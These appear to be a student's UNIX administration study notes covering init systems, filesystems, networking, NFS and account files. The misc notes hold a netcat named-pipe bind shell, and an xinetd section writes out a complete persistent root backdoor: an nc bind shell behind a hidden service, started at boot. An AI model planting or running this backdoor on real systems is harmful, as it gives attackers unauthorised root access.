 ``` MISC NOTES 
shell env: env variables typically (should be) in /etc/profile or .zshenv/ .bashenv // for login shells and subshells 
			personal scripts/ aliases in .bashrc/.zshrc. also remember .login(like profile) and .logout files! // for interactive shells
Filesystems: 1. Partitioning hard disk, 2. Format partitions (choose filesystem): on-disk formatting + kernel module 
			 3. mount volume into dir structure = VOLUME (any storage device with a single filesystem), interact w device file
				- linux uses psuedo filesystems (/dev /proc) and pseudo devices (pts0, loop0, /dev/null) for sysinfo and interface to system parameters/kernel drivers
				- volume: logical concept representing a storage device e.g. mount volumes to a FS 
device file = interface to device driver as if normal file 

ls output 
	-i option = shows inode of file(s) 
	before permissions: l(symlink),s(socket),b(block device),p(named pipe). how to tell hard link? same inode!

# /etc/rcX.d startup scripts = SYMLINKS to /etc/init.d/[scripts] || diff by HOW start and where start 
	- SysV order: inittab -> /etc/rc.sysinit -> rcX level scripts -> rc.local

# scripting: circular data flow exists! 
	mkfifo /tmp/namedpipe
	cat /tmp/namedpipe | nc -lp 1111 | bash > /tmp/namedpipe 
	
	
	
convert epoch time 
	date --date='@1408452190'

FIND (script ex., -newerXY syntax) 
	#1. find files by extension 
	for i in `ls -d /root/Arvala-7/*`; do file $i; done | grep Python

	#2. find files between 2 timestamp of file1 and file 2
	stat [file1] [file2]
	find / -newermt "2016-08-14 22:53:04"  ! -newermt "2016-08-24 22:53:04"
		- newermt # -newerXY == timestamp reference
					a = access time
					B = birth time
					c = inode status change time 
					m = moidifcation time 
					t = reference interpreted directly as time 

CUT/SED/AWK
	cut -d" " -f1 // delimiter and field 
	sed "s/replace_text/tgt_text/g" # remember to escape especial chars \ 
	
	command | awk print '{$1,$2,$3}
	
INITITALIZATION determ. methods:
	1. man init 
	SysV /etc/init.d /etc/rc.d/init.d <=== MOST UNIX have this for back comp. Watch out 
	/etc/init/ = Upstart
	init = PID1 ===> SysV, Debian (systemd) / upstart also have though ... 
	look for wordage in /etc/inittab and /etc/init/*.conf files 
	
FIREWALL RULES - consider 
	o is it destined for iptables host? (INPUT/OUTPUT chains) or another host a.k.a. to be routed (FORWARD chains)
	o consider table order: mangle -> nat -> filter 
		e.g. incoming local: NAT-PREROUTE -> FILTER-INPUT -> FILTER-OUTPUT -> NAT POSTROUTE 
		e.g. incoming routed: NAT-PREROUTE -> FILTER-FORWARD -> NAT-POSTROUTE 
	o firewalld order: source ip -> interface -> default zone 
	o when analyzing matches, look at: src IP -> protocol -> port 

```


{ ``` 1. UNIX Arch and Design ``` 

{ ``` 1.1 Kernel Basics & Config Files (truss, strace, sysctl, lsmod/modprobe/insmod/rmmod/modload/modinfo ```

{ # Notable syscalls and COMMON UNIX commands 
// syscalls
perform file operations
	open(), read(), write(), and close()
process manipulation operations
	fork(), execve(), and kill()
memory operations
	using mmap(), brk(), munmap(), free(), malloc()
sending data via the network
	socket(), recv(), and send()
permissions
	chmod(), chown(),
	
# commands
chmod, chown
dmesg
insmod,lsmod,modinfo,modprobe
make
strace,truss
sysctl
pmap (report  memory map of process)

# notable kernel functions 
- scheduler (allocate CPU cycles to procs), memory management, process management, IPC, networking, IO & device mgmnt, Permissions/access, abstraction layer (user space)
}

{ # Truss & Strace 

# write output to file 
truss -o outputfile ps -elf
strace -o outputfile echo "hello my buddy" > bud

# trace process with PID (actively monitor it)
strace -p [PID]

} 

{ # sysctl 

# view all tunable parameters 
sysctl -a 

# view specific param
sysctl -n [name] 
	sysctl -n kernel.msgmax 
	sysctl net.ipv4.conf.all.forwarding

# set a param/ enable ipv4 forwarding (non persistent on reboot)
sysctl net.ipv4.conf.all.forwarding=1
sysctl -w net.ipv4.conf.all.forwarding=1
}

{ # MODULES --- device drivers ARE loadable kernel modules

# lsmod - list kernel modules 
lsmod 

# modprobe - add or remove modules
modprobe -l # list drivers --- ONLY ON CERTAIN VERSIONS

# insmod - insert kernel module 
insmod [mod path]
	insmod /tmp/wl.ko
	
# modload - load a kernel module 
modload [-p] [-e exec_file] filename

# modinfo 
modinfo [mod]
	modinfo dm_zero
	
# rmmod - remove mod
rmmod [mod]
	rmmod firewire-core 

}

}

{ ``` 1.3 Filesystems ```

{ # Commands to KNOW 
	# known
	dd # convert and copy file (DATA DUMP)
	diskinfo
	df # file system disk space usage. mounted devices
	du # disk usage - show filespace used by files/directories // du -sh = show human readable vals 
	file
	link
	unlink 
	ln
	stat 
	strings
	mount # show mounted FS (and type of filesystem), mount a FS
	umount #unmount FS 

	#unnkown
	fdisk # partition table manipulator 
	fsck # check / repair a Linux FS 
	fuser # identify procs using files/sockets 
	mkfs 
	quota # disk usage and limits
	losetup # associate file with pseudo device (loop device) to use as a block device
	}

{ # BLOCK INFO 

# dumpe2fs - display superblock of FS on device mounted on /boot  --- for EXT
mount
dumpe2fs -ob /dev/sda1
dumpe2fs /dev/sda1 | grep -i superblock
	# if XFS use 
		xfs_info /dev/sda1 

# dd - display superblock in hexidecimal format 
dd if/dev/sda1 bs=20124 skip=2 

}

{ # MOUNTING A VOLUME - Attach a filesystem/device to filesystem 
- creating 250MB .img -> ext3 FS, setting as loopdevice (pseudo) and mounting to /mnt 

# generate file - 250MB of NULL bytes 
dd if=/dev/zero of=/tmp/my_stuff.img bs=2M count=125 

# losetup - associate /tmp/my_stuff.img with /dev/loop0 --- loop device (pseudo-device) make file accessible as block device
losetup /dev/loop0 /tmp/my_stuff.img
losetup /dev/loop0 # view info 

# mkfs - create ext3 filesystem on /tmp/my_stuff.img w/block 1024
mkfs.ext3 -b 1024 /dev/loop0 -j -L my_stuff
mkfs -t ext3 -b 1024 /dev/loop0 
mkfs -t ext3 /dev/loop0 

# mkisofs - create an iso file from all the contents of /etc and store it as /tmp/my_stuff.iso
mkisofs -iso-level 3 -o /tmp/my_stuff.iso /etc # iso level 3 so filenames not truncated to FAT32 8.3 naming format 

# mount - mount /tmp/my_stuff.iso on the /media directory?
mount -t iso9660 /dev/loop1 /media
mount /dev/loop1 /media

# mount - mkfs.ext3 -b 1024 /dev/loop0 -j -L my_stuff
mount -t ext3 /dev/loop0 /mnt 

# umount - unmount the .img and .iso 
umount /media
umount /mnt

{ # module ex example - attach a filesystem contained within /tmp/filesystem.ext
	
# 1. Create the loop device needed to allow the operating system to see the file as a block device
losetup /dev/loop0 /tmp/filesystem.ext

# 2. Mount the file system to /media/assessment
mkdir /media/assessment 
mount /dev/loop0 /media/assessment

# 3. Rename the file removeme to donotdeleteme
cd /media/assessment
mv removeme donotdeleteme

# 4. Copy the ls binary to the filesystem
which ls
cp /bin/ls /media/assessment

# 5. Change the volume label of the filesystem to assessment
e2label /dev/loop0 assessment
e2label /dev/loop0 # confirm labeled!

}

}

{ # LINKING - note, we CREATE the links. Not linking two existing files/dirs together (usually)

# hard link 
ln [file1] [file2]
	// same inode
	// cant use for directories 
	
# soft/ symbolic link 
ln -s [file1/dir1] [file/dir2] 
	// diff inodes, points to file loc
	
# create soft link in /home/bob linked to /run
sudo ln -s /run /home/bob/bobsrun

# create hard link in /home/bob linked to /etc/nsswitch.conf 
sudo ln /etc/nsswitch.conf  /home/bob/bobsnsswitch
	sudo link /etc/nsswitch.conf  /home/bob/bobsnsswitch

# display inode and number of hardlinks 
ls -li [dir/file]

# remove soft link or hardlink 
rm -f [linkname] 
unlink [linkname]
}

{ # FIND
# find files within 2 layers down directory hierarchy
find /usr/bin -maxdepth 2

# find tests 
find /usr/bin -maxdepth 2 -name chmod 
-and / -a
-or -not 

# find actions - search /var struct for filenames with .log extension, count number of lines in each file
find /var -name \*.log -exec wc -l \{\} \;• Is -name an option?
 //The braces, which may need to be escaped with backslashes or quoted to be shell-safe, expand to the current filename, or set of filenames, being processed. 
 // use of -exec: execute commands on found files \{\} 
 
# find all named pipes 
find / -type p 

# find all log files in /var/log
find /var/log -name '*.log'

# find paths that share same inode as file (hardlinks)
find / -samefile [file]
	or 
	ls -i [file/dir]
	find / -inum [inode number]

# measure times (atime/ctime/mtime/mmin,etc) from beginning of TODAY rather than 24hours prior 
find / -daytime

# lists all block or character devices that are not in /dev.
find / \! -wholename '/dev*' \( -type b -o -type c \)

# find all .htm files in directory and change extensions to html 
find /var/www/html -type f -name '*.htm' -exec mv \{\} \{\}l \;

# Change all soft links in /lib and /usr/lib that currently point to /usr/lib/libmenu.so.5.5 to have them point to /usr/lib/libmenu.so.5.6 instead.
find /lib /usr/lib -lname '/usr/lib/libmenu.so.5.5' -exec ln -fs /usr/lib/libmenu.so.5.6 \{\} \;

# other options
	-wholename # doesnt treat / or . as special characters e.g. "der*thon" would produce /derelict/python.gif
	-empty # only display empty files (regular file or directory)

# and/or options
	-o -not -and/ -a 
	e.g. find /usr/share/pix/holly/cedar -empty -o -name '*.png'

}


}

{ ``` 1.4 Boot and Initialization ```

{ # Commands to know 
	# known
	systemctl / sysctl # configure kernel parameters at runtime 
	who 
	service # run a SysV script located in /etc/init.d/SCRIPT  

	# unknown
	chkconfig # updates/queries runlevel info for system services (maint /etc/rc[0-6].d dir
		chkconfig -l # list services on boot 
		chkconfig [service] on/off # enable/disable 
		chkconfig --del [service] # uninstall it 
	init # process control initialization
	initctl # control/manage init daemon (idk what OS) 
	invoke-rc.d # executes SysV style init script actions /etc/init.d/[name] // Ubuntu
	update-rc.d # install/remove SysV style init script links // Ubuntu 
	runlevel # print previous/current SysV runlevel 
	svc.startd 
	svcs # report service status // Solaris 
	serviceadm # manipulate service instances
}

{ # MBR 
# extract MBR with dd
mount - see which device mounted on /boot // sda1 = dd first partition of sda
dd if=/dev/sda of=/path/to/mbr_file.img bs=512 count=1 # to a file (would need to gen .img with null bytes, example above)
dd if=/dev/sda bs=512 count=1 | hexdump -C # to screen

# modify /boot/grub/stage1 (MBR stage 1 template) to say GLUB instead of GLUB // R is located at 0x180 (384) 
cp /boot/grub/stage1 /boot/grub/stage1.bak # backup 
echo -n 'L' | dd of=/boot/grub/stage1 bs=1 seek=384 conv=notrunc

# grub-install // install grub on a drive - grub-install writes to /stage1 will REVERT our edit to /stage1
grub-install /dev/sda 

# directly modify the MBR - MAY BRICK DEVICE (be sure to run on a VM; something can reboot/revert)
echo -n 'L' | dd of=/boot/grub/stage1 bs=1 seek=384 conv=notrunc
	init 6
	// this works 

}

{ # SysV --- /etc/inittab, /etc/rc.d/, Runlevels - System Initialization and Management (who -r/runlevl, service, insserv, chkconfig, update-rc.d) 

# view runlevel 
who -r 
runlevel # (linux)

# switch runlevel 
init [level]

# SysV service management 
service
	# check service status 
	service [name] status
	service ntp status
	# GRACEFULLY stop service - will run until service is 
	service ntp stop 
		# locate services via 
			1. netstat -punta 
			2. startup scripts : find /etc/init | egrep -i "ssh|dovecot|echo|python|ltsrv
			3. find: find /etc/init | egrep -i "ssh|dovecot|echo|python|ltsrv # look in /usr/bin or /usr/sbin for service binary
			# or may need to do a full / search of name if not there
		sudo service ssh stop && sudo service dovecot stop && sudo service crazy8 stop && sudo service echo stop && \
		sudo service srv stop 
	OR
		sudo initctl stop ssh
		sudo initctl stop dovecot
		sudo initctl stop echo

chkconfig 

# list number of startup services for runlevel 2 
ls /etc/rc2.d | egrep "^S.*" | wc -l 
	insserv -s # The output is in the format of: Start_or_Stop:Start_Order_Number:Enabled_Run_Levels:Service_Name. For instance, ssh service appears as S:17:2 3 4 5:ssh. This means it will start in runlevels 2, 3, 4, and 5.

# determine how many runlevels a service is enabled in?
ls /etc/rcX.d | egrep "^S.*SERVICE_NAME
	insserv -s | grep "S.*SERVICE_NAME

# enable a service to start in a different runlevel (e.g. auditd in runlevel 2)
chkconfig --level 2 auditd on
	chkconfig --level 2345 telnet on
update-rc.d auditd enable 2 
	update-rc.d auditd default 2 
	
# disable a service by renaming the runlevel rc to K instead of S 
cp /etc/rc3.d/S01auditd /etc/rc3.d/K01auditd

# change default runlevel
vi /etc/inittab 
-- find id line 
id [runlevel] initdefault

}

{ # Upstart (initctl, update-rc.d)
# find runlevel
vim /etc/rc-sysinit.conf
	/etc/inittab # for linux and CentOS Upstarts 
	who -r 
	runlevel 

# find startup scripts for runlevel - same structure as SysV 
ls -l /etc/rc2.d/S*

# switch runlevel 
telinit 3

# start service 
initctl start apache2
	service apache2 start # for SysV service

# show currently running upstart managed services 
initctl list 

# show stop/start conditions for all services 
initctl show-config

# examine upstart services more in-depth // what conditions will cron service start?
initctl show-config cron 
vim /etc/init/cron.conf  # or view by  


}

{ # Systemd (systemctl )

# list all unit files and statuses
systemctl list-unit-files 
systemctl list-units --all 

# list ACTIVE units and SUBACTIVE state units / attempted to load into memory 
systemctl list-units

# list only enabled units 
systemctl list-unit-files --type=service --state=enabled
	systemctl list-unit-files -t service | grep enabled | wc -l # num enabled on boot

# is specifc unit enabled?
	systemctl status UNIT_NAME
	systemctl is-enabled UNIT_NAME

# what units have been modified on a system?
systemd-delta 

# view unit's dependencies 
systemctl list-dependencies [unit] --no-pager 
	systemctl list-dependencies sshd --no-pager 

# view units -depedent- on the unit 
systemctl list-dependencies [unit] --reverse 

# determine the systemd default startup file 
systemctl get-default
	ls -l /etc/systemd/system/default.target # what target is symlinked 

# !!! view the CURRENT target 
journalctl # find current message date and review OR 
	journalctl --list-units 
journaltctl --no-pager | grep "Reached target"
	!CONSIDER: jounralctl -b // view entries since last boot

# change default target 
systemctl set-default multi-user.target 

# check if target is ACTIVE 
systemctl is-active graphical.target

# immediately change target 
systemctl isolate multi-user.target

{ # Configure systemd unit 
1. create [unit_name].service in /usr/lib/systemd/system 

2. at minimum, include 

[Service]
ExecStart=/path/to/file   

[Install]
WantedBy=multi-user.target   
	# create symbolic link in /etc/systemd/system/multi-user.target.wants dir 
	
3. run
	systemctl daemon-reload
	systemctl enable my.service 

} 

}

{ # SMF - Service Management Facility / SOLARIS 

# view runlevel 
who -r 

# manage SMF svcs
svcadm 
svcs 

# get service status 
svcs -l <name> 

# list all avail. services
svcs -a 

# start/stop/restart service  -t == temporary 
svcadm enable|disable -t <name>
svcadm restart <name>

# enable/disable service 
svcadm enable|disable <name>
	svcadm disable svc:/system/cron # alternate

# get current milestone 
svcs milestone*

# set default milestone 
svcadm milestone -d <milestone>

# get default milestone 
svcpropc svc:/system/svc/restarter:default/:properties/options/milestone
	#If svcprop returns a message that the argument ‘doesn’t match any entities’, it means that the default milestone has not been set manually. In this case, the default milestone is multi-user-server

# determine services are configured on boot 
svcs -a | egrep ‘online|legacy_run.*rc[0123S]_d’

# view online services 
svcs | grep online 

# manage  inet services (anything net related e.g. telnet, ssh, web)
inetadm  # will view all inetd services 

# examine files/ports inetd has opened 
pfiles -F <pid_of_inted> | less
	/etc/services 

}

}

{ ``` 1.5 Processes and Signals ``` 

{ # Basic Commands

	# UNIX
	chmod
	chown
	fuser // identify processes using files/sockets  
	kill // send simple signal 
		kill -s [signal] [pid]
		kill -9 pid # kill proc
	trap // handle signal synchronously: process waits for the signal before continuing its execution
	pgrep
	pkill
	pmap // report memory map of process 
		map [pid]
	ps 
	top
	nice/renice // change priority of running process (for sched on next time slice)

	# SOLARIS
	pargs // print process args, env vars, or auxiliary vector??
	pcred // print credentials of eah proc (effective/real/saved UID and GIDs)

	pfiles // like lsof --- report fstat and fcntl info for all opeen files in each proc + path to each file // print file descriptor table 
		pfiles -F <pid_of_inted> | less
	prstat / report active process statistics

	pldd // list DLLs linked to each proc, including .so 
	preap // force a defunct proc to be REAPd by parent
	psig // list signal actions and handlers of each proc
	pstop // stop each proc 
	prun // run a proc 
	ptime // time a command using microstate accounting?!
	ptree // print process trees
	pwdx // print working dir of each proc 

	# LINUX 
	atop // advanced - system & proc monitor
	htop // interactive process viewer. top+ (scroll vertically/horizontally, process tree, act on multiple procs, etc)
	lsof // like pfiles --- list open files  (command, PID, path)  // print file descriptor table 
	pstree // display tree of procs 

}

{ # Signals and Jobs 

# place suspended program into background 
1. run prog 2. ctrl+z 3. bg [suspend #]

# view running jobs and states
jobs

# resume a job 
	fg [job num]
	% [job num]

# kill - terminate OR SIGNAL procs ===> not JUST terminate: can suspend, continue, interup, terminate 
	kill %[pid] // sigint
	kill -9 [pid] // KILL 
	kill -SIGCONT PID // continue / resume a job 
	kill -SIGSTOP [pid] // stop (suspend)

# handle signals (in bash script)
	trap [exec command] [sig1 sig2 ...]
	trap SIGINT SIGTERM 
	trap "echo NOPE!" SIGINT
	
}

{ # Commands to read /proc data structures 
	pargs
		proc args /path
	pcred
		Displays process credential information
	pfiles
		Reports fstat and fcntl information for open files in a process
		pfiles -F <pid_of_inted> | less
	pflags
		Prints /proc tracing flags, pending signals and held signals, and other status information
	pldd
		Lists the dynamic libraries that are linked into a process
	pmap
		Prints the address space map of each process
	psig
		Lists the signal actions and handlers of each process
		# https://unix.stackexchange.com/questions/163573/what-is-the-meaning-of-every-column-when-executing-psig-command
	prun
		Starts each process
	pstack
		Prints a hex+symbolic stack trace for each lwp in each process
	pstop
		Stops each process
	ptime
		Times a process by using microstate accounting
	ptree # good for listing parent?/child
		Displays the process trees that contain the process
	pwait
		Displays status information after a process terminates
	pwdx
		Displays the current working directory for a process
}


}

{ ``` 1.6 Networking and Name Resolution --- can refer for networking milestone```

{ # Commands 2 Know  
	finger
	getent # helps the user to get the entries in databases like  passwd and group // query /etc/nsswitch.conf databases
		# hosts, users, groups, email aliases
		getent passwd rahul
	hostname
	ifconfig
	ip
	netstat
		netstat -punta # linux 
		netstat -an -P tcp # Solaris
	dig # Domain Information GROPER : dns lookup 
	nslookup # interactive and non-interactive modes (query NS for info/print list of hosts in domain VS just print name and requested info for a host/domain) 
	ping/traceroute
	route
	ss
	telnet 
	exportfs # make a dir/share available for NFS
	mount
	showmount # show remote mounts 
		showmount -e [hostname] # exports 
	
	mkfifo 
}

{ # Basic Network Characterization
ipconfig # sub interfaces? 
	ip a  
	
arp -an # static ARP entries?
	ip neigh

netstat -punta # Custom routes? Default should be: 1. Connected LANs 2. Link local 3. Default GW
	ss 
	
ping / traceroute 


}

{ # Network config vid - SOLARIS(10+) + Redhat  

{ 	/////// SOLARIS - nix \\\\\\\\\
	ifconfig -a # e1000g0

	--------- CONFIGS --------
	cat /etc/hostname # looks for hostnames 

	cat /etc/hosts # assigned IP addresses (solaris Update 4 and later)
		cat /etc/inet/ipnodes # updates before Update 4 (or 08/07)
		
	cat /etc/nodename # finds canonical hostnames (helps if multiple interfaces w/different hostnames)

	cat /etc/netmasks # associated netmasks 

	cat /etc/defaultrouter # default gateway 
		cat /etc/gateways # more complex routing taples/ multiple networking interfaces 
		cat /etc/notrouter # exists if NOT a router 
		
	cat /etc/resolv.conf # DNS servers / host queires without FQDN 

	--------- CHANGES -------- # effect on next boot  

	# Add static route (solaris) - /etc/gateways if in use 
	echo ‘net 172.17.0.0/25 gateway 192.168.11.15 metric 2 passive’ >> /etc/gateways 
		# alternate 
		echo ‘net 172.17.0.0/25 gateway 192.168.11.15' >> /etc/inet/static_route 

	# show hostname 
	hostname 

	# routing table 
	netstat -rn  

	# DNS settings = persistent AND active 
	cat /etc/resolv.conf 

	# arp cache 
	arp -an # views recently commnicated w/machines 

	# established TCP connections 
	netstat -an -f inet -P tcp

	# established UDP 
	netstat -an inet -P udp 
}

{ /////// Redhat/CentOS - linux/unix like \\\\\\\\\
ifconfig 
	# can use eth0 / lo 

---------- config -----------
# interface - ip configuration 
cat /etc/sysconfig/network-scripts/ifcfg-eth0 
	// MAC is optional, but must be correct 
	// ONBOOT = started on boot!?!
	// BOOTPROTO = statically configured via this file, otherwise MUST use DHCP 

# old hostname + default GW. ***gateway could also be ^ file*** 
cat /etc/sysconfig/network 
# newer (systemd) distros - rhel7+ & debian 
cat /etc/hostname # sole place for hostname 
	cat /etc/hosts #optionally stored , not required 

# static routes - stored in route file for THE INTERFACE 
echo '172.17.0.0/24 via 192.168.11.15' > /etc/sysconfig/network-scripts/route-eth0 
	# format 2 
	echo -e 'ADDRESS0=172.17.0.0\nNETMASK0=255.255.255.128\nGATEWAY0=192.168.11.15' > /etc/sysconfig/network-scripts/route-eth0 ; cat /etc/sysconfig/network-scripts/route-eth0

---------- state -----------
ifconfig 

hostname 

netstat -rn 

cat /etc/resolv.conf 

arp -vn

netstat -punta 



}

{ /// reconfig network device - SOLARIS \\\ 
	-------- mod active state then update config files --------

	ifconfig e1000g0 172.18.31.14 netmask 255.255.255.0 up  # change IP address or netmask 
	ifconfig e1000g0 down  
	iconfig e1000g0 ether 00:50:56:0d:01:14 # spoof MAC address - fit into scheme in new network 
		ifconfig e1000g0 down; ifconfig e1000g0 update
	
	ifconfig e1000g0 dhcp start # start dhcp on interface 
		ifconfig e1000g0 dhcp release # turn it off
	
	hostname hamster # change hostname 
	
	route add default 172.18.31.253; route delete default 192.168.11.254 # change default gw
	
	# add/delete static route 
	route add 172.17.0.0/25 172.18.31.12 
	route delete 172.17.0.0/25 172.18.31.12 
	
	# add /delete static arp entries 
	arp -s 172.18.31.12 00:50:56:0D:01:12
	arp -d 172.18.31.12
	
	# change DNS settings 
	echo -e 'domain fatdeer.lab\nnameserver 192.0.2.2' > /etc/resolv.conf
		nslookup ww # confirm our dns settings 
		
	# persist network config files 
	vi /etc/hosts # change IP address for hostname 
	echo hamster > /etc/nodename # canon. hostname 
	echo 'hamster ether 00:50:56:0d:01:12' > /etc/hostname.e1000g0 # MAC 
	touch /etc/dhcp.e1000g0 # IF need to set interface to use DHCP 
	echo -e '172.18.31.0\t255.255.255.0' >> /etc/netmasks # update netmask 
	echo -e 172.18.31.253 > /etc/defaultrouter # default gateway 
	echo '172.17.0.0/25 172.18.31.12' > /etc/inet/static_routes # persistent static route 

}

{ /// reconfig network device - RHEL \\\ 
	-------- mod active state then update config files --------
	ifconfig eth0 172.18.31.13 netmask 255.255.255.0 up # change IP/netmask 
	ifconfig eth0 down / up # would clear out all nonperst. settings on interface (by reading from disk settings) 
	ifconfig eth0 hw ether 00:50:56:0d:01:13 # spoof MAC 

	dhclient eth0 # enable dhcp 
	dhclient -r eth0 # turn off 
	
	hostname goldfish.fatdeer.lab # change hostname 
	
	route add default gw 172.81.31.253 # change default gw 

	# add / remove static route 
	route add -net 172.17.0.0 netmask 255.255.255.128 gw 172.18.31.2 
	route del -net 172.17.0.0 netmask 255.255.255.128

	# add/ delete static arp entries 
	arp -s 172.18.31.12 00:50:56:0d:01:12; arp -vn
	arp -d 172.18.31.12 00:50:56:0d:01:12
	
	# if no arp/netstat / unavailable - can use IP and ss 
	
	------- persistent config changes ---------
	echo -e 'search fatdeer.lab\nnameserver 192.0.2.2' > /etc/resolv.conf # DNS update 
	
	# confirm 
	ping -c1 172.18.31.14 
	
	vi /etc/sysconfig/network-scripts/ifcfg-eth0
		// update IP
		// add MACADDR=xx.xx.xx.xx.xx to change MACADDR --- HWADDR MUST match actual hardware 
		// if want to use DHCP, change BOOTPROTO=dhcp
			# and remove ipaddr, netmask or prefix/gateway variables 
			
	vi /etc/sysconfig/network # update hostname/gateway 
	vi /etc/hostname 
	vi /etc/hosts 
	
	echo '172.17.0.0/25 via 172.18.31.2' > /etc/sysconfig/network-scripts/route-eth0 
	
	# SOME lin systems may have MULTIPLE network profiles - and store in another loc 
	ls /etc/sysconfig/networking/devices / etc/sysconfig/networking/profiles/default
	
}

}

{  # DNS 
# ns lookups
host example.com # basic hostname lookup 
dig @8.8.8.8 example.com # advanced host lookup 
nslookup example.com # query internet domain name servers

# verify DNS lookups
	getent ahosts example.com 
	
# get IP address for www.ops.local
getent hosts www.ops.local

# resolve www.ops.local to 172.16.16.16 
echo -e '172.16.16.16\twww.ops.local' >> /etc/hosts 


}

{ # NFS 

	{ # Configure (export) NFS share 

	# 1. Check if NFS is running 
	systemctl status nfs
	netstat -punta 

	# 2. if not, enabele it 
	systemctl start/enable nfs 

	# 3. Make a dir 
	mkdir /var/mysharemv 

	# 4. edit /etc/exports - share dir to all users on 192.168.11.0/24
	echo '/var/myshare 192.168.11.0/24(rw)' > /etc/exports
		To enable access to a single client: /var/yourdir <clientIP>(rw)
		To enable access to several clients: /var/yourdir <clientIP1>(rw) <clientIP2>(rw)
		To enable access to an entire subnet: /var/yourdir <subnetIP>/<subnetMask>(rw).

	# 5. update NFS service
	exportfs -a # all exports listed in /etc/exports and listed in the files under /etc/exports.d to /var/lib/nfs/etab
		exportfs :/var/myshare # alternative
		exportfs user:/var/myshare # for specific users
		
	# optional: stop sharing 
	exportfs -u <host>:<shared dir>
	}

	{ # Mount remote share 
	# show available shares/mounts on remote system
	showmount [remoteTGT] 

	# view remote shares (exports)
	showmount --exports nfsshare.ops.local
		-e 
	# Mount an NFS Volume 
	mkdir /mnt/remoteshare
	mount -t nfs nfsshare.ops.local:/var/JurassicJunction /mnt/remoteshare

	mount -t nfs [nfs_volume] [local_dir] [options]

	# configure host to mount remote share on boot 
	mkdir /mnt/remoteshare
	echo -e 'nfsshare.ops.local:/var/JurassicJunction /mnt/remoteshare nfs\tdefaults\t0 0' >> /etc/fstab
		// example
		# <file system>     <dir>       <type>   <options>   <dump>	<pass>
		10.10.0.10:/backups /var/backups  nfs      defaults    0       0
	init 6

	# unmount 
	umount 10.10.0.10:/backups 
	}

}

{ # xinetd (bash) backdoor - port 31337 trigger, 31338 bindshell 

{ 1. vim /etc/init.d/elite
# METHOD 1 

#!/bin/bash
rm -f /tmp/f; mkfifo /tmp/f
while true; do
	nc -l31338 < /tmp/f | /bin/bash > /tmp/f
done

# METHOD 1.5 
rm -f /tmp/f; mkfifo /tmp/f
while true; do
	cat /tmp/f | nc -l31338 | /bin/bash > /tmp/f
done

# METHOD 2 - rec way

#!/bin/bash
rm -f /tmp/testfifo
mkfifo /tmp/testfifo
cat /tmp/testfifo | /usr/bin/nc -l 31338 | bash > /tmp/testfifo


}

2. vim /etc/services 
elite		31337/tcp				# Elite Service

{ 3. vim /etc/xinet.d/elite

	service elite 
	{
		socket_type = stream
		protocol = tcp
		user = root
		wait = no
		server = /etc/init.d/elite
		port = 31337
		type = unlisted 
	}
		wait = no // handle multiple connections (non-block)
		
	
	# rec. way
	service elite
	{
	   flags -= IDONLY
	   socket_type = stream
	   wait = yes
	   user = root
	   server = /etc/init.d/elite
	   disable = no
	}
}

4. set xinetd start on boot and/or restart the service 
	chkconfig xinetd on
	sudo systemctl restart xinetd
	service xinetd restart
	init 6


5. connect
	nc [tgtIP] 31337 # trigger
	nc [tgtIP] 31338
	
}


}

}

{ ``` 2. UNIX Enumeration and Hardening  ```

{ ``` 2.1 Users and Permissions``` 

{ # Basic Commands
-------- NIX --------
chgrp # 1. SOLARIS? syntax  
newgrp # log user into new group (change RUID and EUID)
chmod
chown
getent # getentries in nsswitch.conf (databases like files (paswd, shadow,group), sss (ldap, freeIPA, Windows Active Directory), ldap (nslcd/nscd daemon) 
	// sss = system security daemon - PAM local cache authentication (store creds from databases) 2 reduce auth. server load 
	// nslcd/nscd = ldap server auth. daemons. NSCD caches, nslcd doesn't
	
getfacl # get file access control lists 
setfacl # set file access control lists

groupadd #
groupdel #
groupmod #
groups # DISPLAY 

id
ls
passwd
userdel
	userdel -r [user] # removes user homedir and mail spool
useradd
usermod 
umask # user file-creation mask: set default perms for files/dirs a user creates
su 
	su [-] username # - = load users env variables/scripts/profile 
sudo
	sudo [-u] [user] command/script

-------- SOLARIS --------
listusers # list user logins (default sorted by logins, -g for users belonging to groups)
ppriv # inspect/modify process privilege sets and attributes 

-------- LINUX --------
chage # change user paswd expiry information 
gpasswd # administer the /etc/group file 
getcap # display name/capabilities of each specified file
setcap # set file capabilities

}

{ # File / Directory Permissions reference 

	# Read Permission:  
	•	For a directory:  Read means we can access the names of files in that directory 
	•	For a file:  Read means you can view or display the content of the file  
		// To be able to read a file, a user account will need access to the directory with the execute permission. The user account will also need to have read permission on the file.

	#Write Permission:   
	•	For a directory:  Write means you can modify information about the directory itself, such as its name and attributes, add files to the directory, delete files from the directory, and rename files in the directory 
	•	For a file:  Write means you can modify the file content  
		files w perm does not allow create/delete the file - ONLY directory w perm
		// To be able to modify a file, a user account will need access to the directory with the execute permission. The user account will also need to have write permission on the file.

	#Execute Permission:     
	•	For a directory:  Execute means you can -- enter or traverse -- the directory to perform actions on its files and subdirectories 
	•	For a file:  Execute means you can execute the file when it is a script or a program   
			- don't need exec perm on dir to execute the program. just to cd / traverse it

# easy remember method: visualize dir as a FILE that contains list of filenames/pointers (close to the truth). Perms make sense that way 

}

{ # files (database) guide: passwd,shadow,group  
	# /etc/passwd guide
	username:password:UID:GUID:GECOS:homedir:shell
	# examples 
		root:x:0:0:Super-User:/:/bin/bash
		daemon:x:1:1::/:
		lalal:x:105:1::/home/lalal:/bin/bash

	# /etc/shadow guide 
	username:encrypted-passwd:lastchg:min:max:warn:inactive:expire:flag
		passwd: 
			$algorithm-id$salt$encrypted-passwd 
					$algorithm = $1 = MD5, $5 = SHA256, $6 = SHA-512, NO $? = DES 
					$salt = random string used in algorithm for always random passwd
					
			* // account is disabled 
			!! // account is locked  
			[blank] encrypted password field indicates password is not required to log in IF you have access to the console or machine itself (no remote ssh/telnet etc)
			
		lastchg: last change since Jan 1,1970 (epoch) time
		expire: date of expriation since epoch time
		
	# /etc/group guide 
	groupname:grouppasswd:gid:group-members
		grouppasswd: // optional field. users not part of, can termporarily join using this + newgrp command (then exit)
		group-member // only lists users as SECONDARY group. user primary groups shown in /etc/passwd, or would be redundant
		
	# /etc/gshadow 
		// edit group (optional) passwd and group admins. Deprecated on solaris
		gpasswd [group]
		gpasswd -A <user> <group> # make user group admin 
}

{ # getent : query /etc/nsswitch.conf local and network account info - files/sss/ldap
# syntax 
getent (-s <databse_type>] <databse> [<entry>])


# query specific database 
getent -s [files/sss/ldap] 

# get all acc / group entries for users in /etc/nsswitch.conf 
	getent passwd 
	getent group 
	
# get user acc entry from first databse type that user exists
getent passwd <usename>

# get all account entires from ldap database type via nlsc/nscd service 
getent -s ldap passwd 


# other examples 
